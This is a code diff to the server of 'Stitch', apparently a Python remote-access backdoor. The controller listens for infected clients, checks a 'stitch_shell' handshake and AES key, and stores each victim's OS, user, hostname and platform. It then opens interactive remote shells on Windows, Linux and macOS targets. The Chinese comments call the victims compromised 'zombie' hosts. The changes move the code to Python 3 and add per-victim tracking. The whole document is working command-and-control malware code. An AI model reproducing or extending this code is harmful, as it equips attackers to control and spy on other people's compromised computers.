@@ -1,14 +1,15 @@
 from . import stitch_winshell
 from . import stitch_osxshell
 from . import stitch_lnxshell
+from . import stitch_lib
 from .stitch_gen import *
 from .stitch_help import *
 from .stitch_utils import *
 
 class stitch_server(cmd.Cmd):
-    inf_sock = {}
+
+    sock_info_dict = {}
     inf_port = {}
-    inf_name = {}
 
     listen_port = None
     server_thread = None
@@ -20,7 +21,7 @@ class stitch_server(cmd.Cmd):
         self.Config.read(hist_ini)
         self.aes_lib = configparser.ConfigParser()
         self.aes_lib.read(st_aes_lib)
-        self.prompt = "{} {} ".format(st_tag,path_name)
+        self.prompt = f"{st_tag} {path_name} "
         display_banner()
 
     def ConfigSectionMap(self, section):
@@ -45,7 +46,7 @@ class stitch_server(cmd.Cmd):
                 if dict1[option] == -1:
                     pass
             except:
-                print("exception on {}!".format(option))
+                print(f"exception on {option}!")
                 dict1[option] = None
         return dict1
 
@@ -76,7 +77,7 @@ class stitch_server(cmd.Cmd):
             st_print('[!] Could not find {} in your history.\n'.format(section))
 
     def default(self, line):
-        st_log.info('Stitch cmd command: "{}"'.format(line))
+        st_log.info(f'Stitch cmd command: "{line}"')
         st_print(run_command(line))
 
     def run_server(self):
@@ -86,7 +87,7 @@ class stitch_server(cmd.Cmd):
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server.bind(('',self.l_port))
-            server.listen(10)
+            server.listen(2048)
             self.listen_port = self.l_port
         except Exception as e:
             self.server_thread='Failed'
@@ -96,19 +97,61 @@ class stitch_server(cmd.Cmd):
             if not self.server_running:
                 break
             try:
-                server.settimeout(2)
+                server.settimeout(600)
                 client_socket, addr = server.accept()
-            except Exception as e:
-                pass
+            except socket.timeout as e:
+                client_socket = None
             if client_socket:
-                self.inf_sock[addr[0]] = client_socket
-                self.inf_port[addr[0]] = addr[1]
-                st_print('[+] New successful connection from {}\n'.format(addr))
+                self.sock_info_dict[addr[0]] = {'sock': client_socket, 'port': addr[1]}
+
+                # 打算将接受肉鸡信息代码放到这里
+
+                try:
+                    st_confirm = self.receive(client_socket,encryption=False).decode()
+                    if st_confirm == base64.b64encode('stitch_shell'.encode()).decode():
+                        conn_aes = self.receive(client_socket,encryption=False).decode()
+                        if conn_aes in self.aes_lib.sections():
+                            self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
+                            self.aes_enc = base64.b64decode(self.aes_enc)
+                            st_print(f'[+] Connection successful from {addr}')
+                            target_os = self.receive(client_socket).decode()
+                            target_user = stitch_lib.st_receive(client_socket, self.aes_enc).decode()
+                            target_hostname = stitch_lib.st_receive(client_socket, self.aes_enc).decode()
+                            target_platform = stitch_lib.st_receive(client_socket, self.aes_enc).decode()
+                            self.sock_info_dict[addr[0]]['os'] = target_os
+                            self.sock_info_dict[addr[0]]['user'] = target_user
+                            self.sock_info_dict[addr[0]]['hostname'] = target_hostname
+                            self.sock_info_dict[addr[0]]['platform'] = target_platform
+                            self.sock_info_dict[addr[0]]['aes_key'] = self.aes_enc
+                            '''
+                            肉鸡信息核心存储结构
+                            self.sock_info_dict = {
+                                '1.1.1.1': {
+                                    'sock': socket_instance,
+                                    'port': 15421,
+                                    'os': 'win',
+                                    'user': 'Administrator',
+                                    'hostname': 'DESKTOP-1984',
+                                    'platform': 'windows10-17.09 0.84524',
+                                    'aes_key': self.aes_enc,
+                                    }
+                            }
+                            '''
+                        else:
+                            self.sock_info_dict[addr[0]]['sock'].close()
+                    else:
+                        self.sock_info_dict[addr[0]]['sock'].close()
+                except Exception as e:
+                    st_print("[!] Exception!")
+                    st_print(f"[*] {e}")
+                    st_log.error(f'Exception:\n{e}', exc_info=True)
+                    st_print(f"[-] Disconnected from {addr[0]}\n")
+                    self.sock_info_dict[addr[0]]['sock'].close()
+
                 client_socket = None
         server.close()
-        for n in self.inf_sock: self.inf_sock[n].close()
-        self.inf_sock={}
-        self.inf_port={}
+        for ip in self.sock_info_dict.keys(): self.sock_info_dict[ip]['sock'].close()
+        self.sock_info_dict = {}
         self.listen_port=None
         self.server_thread=None
 
@@ -128,7 +171,7 @@ class stitch_server(cmd.Cmd):
         return buf
 
     def receive(self,sock,encryption=True):
-        full_response = ""
+        full_response = b""
         while True:
             lengthbuf = self.recvall(sock, 4, encryption=False)
             length, = struct.unpack('!i', lengthbuf)
@@ -153,7 +196,7 @@ class stitch_server(cmd.Cmd):
     def do_cat(self,line):
         if line:
             if windows_client():
-                cmd ='more {}'.format(line)
+                cmd =f'more {line}'
             else:
                 cmd = 'cat {}'.format(line)
             st_print(run_command(cmd))
@@ -164,22 +207,16 @@ class stitch_server(cmd.Cmd):
         if line != '':
             try:
                 os.chdir(line)
-                print
+                print('')
             except Exception as e:
                 st_print("[*] {}\n".format(e))
         else:
             self.do_pwd(line)
         self.path_name= get_cwd()
-        self.prompt = "{} {} ".format(st_tag,self.path_name)
-
-    def do_cls(self, line):
-        clear_screen()
+        self.prompt = f"{st_tag} {self.path_name} "
 
     def do_clear(self, line):
         clear_screen()
-
-    def do_dir(self,line):
-        self.do_ls(line)
 
     def do_history(self, line):
         self.display_history()
@@ -193,23 +230,20 @@ class stitch_server(cmd.Cmd):
     def do_home(self, line):
         display_banner()
 
-    def do_ipconfig(self,line):
-        if windows_client():
-            cmd = 'ipconfig {}'.format(line)
-        else:
-            cmd = 'ifconfig {}'.format(line)
-        st_print(run_command(cmd))
-
     def do_ifconfig(self,line):
-        self.do_ipconfig(line)
+        if windows_client():
+            cmd = f'ipconfig {line}'
+        else:
+            cmd = f'ifconfig {line}'
+        st_print(run_command(cmd))
 
     def do_lsmod(self,line):
         if windows_client():
-            cmd = 'driverquery {}'.format(line)
+            cmd = f'driverquery {line}'
         elif linux_client():
-            cmd = 'lsmod {}'.format(line)
+            cmd = f'lsmod {line}'
         else:
-            cmd = 'kextstat {}'.format(line)
+            cmd = f'kextstat {line}'
         st_print(run_command(cmd))
 
     def do_ls(self,line):
@@ -245,50 +279,41 @@ class stitch_server(cmd.Cmd):
                     st_print("[+] Now listening on port {}\n".format(self.l_port))
                     break
 
-    def do_more(self,line):
-        if line:
-            self.do_cat(line)
-        else:
-            usage_more()
-
     def do_pwd(self,line):
         st_print('{}\n'.format(os.getcwd()))
 
     def do_ps(self,line):
         if windows_client():
-            cmd = 'tasklist {}'.format(line)
+            cmd = f'tasklist {line}'
         else:
-            cmd = 'ps {}'.format(line)
+            cmd = f'ps {line}'
         st_print(run_command(cmd))
 
     def do_start(self, line):
         if windows_client():
-            cmd = 'start {}'.format(line)
+            cmd = f'start {line}'
         elif osx_client() and not line:
             cmd = 'open -a Terminal .'
         else:
-            cmd = './{} &'.format(line)
+            cmd = f'./{line} &'
         st_print(start_command(cmd))
 
     def do_sessions(self,line):
         i = 0
         session_title = '=== Connected to port {} ==='.format(self.listen_port)
         st_print(session_title)
-        for n in self.inf_sock:
-            if n in self.Config.sections():
-                n_target = n
-                n_user = self.ConfigSectionMap(n)['user']
-                n_os = self.ConfigSectionMap(n)['os']
-                n_hostname = self.ConfigSectionMap(n)['hostname']
+        for ip in self.sock_info_dict.keys():
+            if ip in self.Config.sections():
+                n_user = self.ConfigSectionMap(ip)['user']
+                n_os = self.ConfigSectionMap(ip)['os']
+                n_hostname = self.ConfigSectionMap(ip)['hostname']
             else:
-                n_target = n
                 n_user = '----'
                 n_os = '----------------'
                 n_hostname = '--------'
-            print_cyan ('\n{}'.format(n),)
-            print_border(len(n),'-')
-            print ('   User: {}\n   Hostname: {}\n'
-            '   Operating System: {}\n'.format(n_user, n_hostname, n_os))
+            print_cyan ('\n{}'.format(ip),)
+            print_border(len(ip),'-')
+            print (f'User: {n_user}\nHostname: {n_hostname}\nOperating System: {n_os}\n')
             i += 1
         print('')
 
@@ -297,43 +322,48 @@ class stitch_server(cmd.Cmd):
             usage_shell()
         else:
             self.target = line
-            if str(self.target) in self.inf_sock:
-                self.conn = self.inf_sock[self.target]
-                self.port = self.inf_port[self.target]
-                del self.inf_sock[self.target]
-                del self.inf_port[self.target]
+            if str(self.target) not in self.sock_info_dict.keys():
+                st_print("[!] There are no active connections to {}\n".format(self.target))
+                return 0
+            else:
+                '''
+                肉鸡信息核心存储结构
+                self.sock_info_dict = {
+                    '1.1.1.1': {
+                        'sock': socket_instance,
+                        'port': 15421,
+                        'os': 'win',
+                        'user': 'Administrator',
+                        'hostname': 'DESKTOP-1984',
+                        'platform': 'windows10-17.09 0.84524',
+                        'aes_key': self.aes_enc,
+                        }
+                }
+                '''
+                self.conn = self.sock_info_dict[self.target]['sock']
+                self.port = self.sock_info_dict[self.target]['port']
+                target_os = self.sock_info_dict[self.target]['os']
                 try:
-                    st_confirm = self.receive(self.conn,encryption=False)
-                    if st_confirm == base64.b64encode('stitch_shell'):
-                        conn_aes = self.receive(self.conn,encryption=False)
-                        if conn_aes in self.aes_lib.sections():
-                            self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
-                            self.aes_enc = base64.b64decode(self.aes_enc)
-                            st_log.info('Starting shell on {}:{}'.format(self.target, self.port))
-                            st_print('[+] Connection successful from {}:{}'.format(self.target, self.port))
-                            target_os = self.receive(self.conn)
-                            if no_error(target_os):
-                                if windows_client(target_os):
-                                    st_print('[*] Starting Windows Shell...\n')
-                                    stitch_winshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
-                                elif linux_client(target_os):
-                                    st_print('[*] Starting Linux Shell...\n')
-                                    stitch_lnxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
-                                elif osx_client(target_os):
-                                    st_print('[*] Starting Mac OS X Shell...\n')
-                                    stitch_osxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
-                                else:
-                                    st.log.error('Unsupported OS: {}'.format(target_os))
-                                    st_print('[!] Unsupported OS: {}\n'.format(target_os))
-                            else:
-                                st_print(target_os)
+                    st_log.info('Starting shell on {}:{}'.format(self.target, self.port))
+                    st_print('[+] Connection successful from {}:{}'.format(self.target, self.port))
+
+                    if no_error(target_os):
+                        if windows_client(target_os):
+                            st_print('[*] Starting Windows Shell...\n')
+                            stitch_winshell.start_shell(self.target, self.sock_info_dict[self.target])
+                        elif linux_client(target_os):
+                            st_print('[*] Starting Linux Shell...\n')
+                            stitch_lnxshell.start_shell(self.target, self.sock_info_dict[self.target])
+                        elif osx_client(target_os):
+                            st_print('[*] Starting Mac OS X Shell...\n')
+                            stitch_osxshell.start_shell(self.target, self.sock_info_dict[self.target])
                         else:
-                            st_print('[!] The target connection is using an encryption key not found in the AES library.')
-                            st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
-                            self.conn.close()
+                            st.log.error('Unsupported OS: {}'.format(target_os))
+                            st_print('[!] Unsupported OS: {}\n'.format(target_os))
                     else:
-                        st_print('[!] Non-stitch application trying to connect.\n')
-                        self.conn.close()
+                        st_print(target_os)
+
+
                 except KeyboardInterrupt:
                     st_print("[-] Disconnected from {}\n".format(self.target))
                     st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
@@ -341,11 +371,10 @@ class stitch_server(cmd.Cmd):
                 except Exception as e:
                     st_print("[!] Exception!")
                     st_print("[*] {}".format(str(e)))
-                    st_log.error('Exception:\n{}'.format(str(e)))
+                    st_log.error('Exception:\n{}'.format(str(e)), exc_info=True)
                     st_print("[-] Disconnected from {}\n".format(self.target))
                     self.conn.close()
-            else:
-                st_print("[!] There are no active connections to {}\n".format(self.target))
+
 
     def do_showkey(self,line):
         show_aes()
@@ -376,26 +405,28 @@ class stitch_server(cmd.Cmd):
             st_log.info('Trying to connect to {}:{}'.format(self.target, self.port))
             try:
                 self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                self.client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 self.client.settimeout(8)
                 self.client.connect((self.target, self.port))
                 st_confirm = self.receive(self.client,encryption=False)
                 if st_confirm == base64.b64encode('stitch_shell'):
-                    conn_aes = self.receive(self.client,encryption=False)
+                    conn_aes = self.receive(self.client,encryption=False).decode()
                     if conn_aes in self.aes_lib.sections():
                         self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                         self.aes_enc = base64.b64decode(self.aes_enc)
                         st_print('[+] Connection successful.')
-                        target_os = self.receive(self.client)
+                        target_os = self.receive(self.client).decode()
                         if no_error(target_os):
                             if windows_client(target_os):
                                 st_print('[*] Starting Windows Shell...\n')
-                                stitch_winshell.start_shell(self.target, self.port,self.client,self.aes_enc)
+                                stitch_winshell.start_shell(self.target, self.sock_info_dict[self.target])
                             elif linux_client(target_os):
                                 st_print('[*] Starting Linux Shell...\n')
-                                stitch_lnxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
+                                stitch_lnxshell.start_shell(self.target, self.sock_info_dict[self.target])
                             elif osx_client(target_os):
-                                st_print('[*] Starting OSX Shell...\n')
-                                stitch_osxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
+                                st_print('[*] Starting Mac OS X Shell...\n')
+                                stitch_osxshell.start_shell(self.target, self.sock_info_dict[self.target])
                             else:
                                 st.log.error('Unsupported OS: {}'.format(target_os))
                                 st_print('[!] Unsupported OS: {}\n'.format(target_os))
@@ -421,22 +452,19 @@ class stitch_server(cmd.Cmd):
 
     def do_touch(self,line):
         if windows_client():
-            cmd = 'if not exist {} type NUL > {}'.format(line,line)
+            cmd = f'if not exist {line} type NUL > {line}'
         else:
-            cmd = 'touch {}'.format(line)
+            cmd = f'touch {line}'
         st_print(run_command(cmd))
 
     def emptyline(self):
         pass
 
     def do_exit(self, line=None):
-        for n in self.inf_sock: self.inf_sock[n].close()
+        for ip in self.sock_info_dict.keys(): self.sock_info_dict[ip]['sock'].close()
         st_print("[-] Exiting Stitch...\n")
         return True
 
-    def do_EOF(self, line):
-        print('')
-        return self.do_exit(line)
 
 ################################################################################
 #                        Start of COMPLETE Section                             #
@@ -460,9 +488,6 @@ class stitch_server(cmd.Cmd):
     def complete_start(self, text, line, begidx, endidx):
         return find_path(text, line, begidx, endidx, all_dir=True)
 
-    def complete_shell(self, text, line, begidx, endidx):
-        return find_completion(text,self.inf_sock)
-
 ################################################################################
 #                        Start of HELP Section                                 #
 ################################################################################
@@ -473,13 +498,9 @@ class stitch_server(cmd.Cmd):
 
     def help_cd(self): st_help_cd()
 
-    def help_cls(self): st_help_cls()
-
     def help_clear(self): st_help_clear()
 
     def help_connect(self): st_help_connect()
-
-    def help_dir(self): st_help_dir()
 
     def help_history(self): st_help_history()
 
@@ -489,15 +510,11 @@ class stitch_server(cmd.Cmd):
 
     def help_ifconfig(self): st_help_ifconfig()
 
-    def help_ipconfig(self): st_help_ipconfig()
-
     def help_lsmod(self): st_help_lsmod()
 
     def help_ls(self): st_help_ls()
 
     def help_listen(self): st_help_listen()
-
-    def help_more(self): st_help_more()
 
     def help_pwd(self): st_help_pwd()
 
@@ -517,7 +534,6 @@ class stitch_server(cmd.Cmd):
 
     def help_exit(self): st_help_exit()
 
-    def help_EOF(self): st_help_EOF()
 
 def server_main():
     try:
@@ -530,7 +546,7 @@ def server_main():
         st_log.info("Exiting Stitch due to a KeyboardInterrupt")
         st.do_exit()
     except Exception as e:
-        st_log.info("Exiting Stitch due to an exception:\n{}".format(str(e)))
+        st_log.info(f"Exiting Stitch due to an exception:\n{e}", exc_info=True)
         st_print("[!] {}\n".format(str(e)))
         st.do_exit()
 
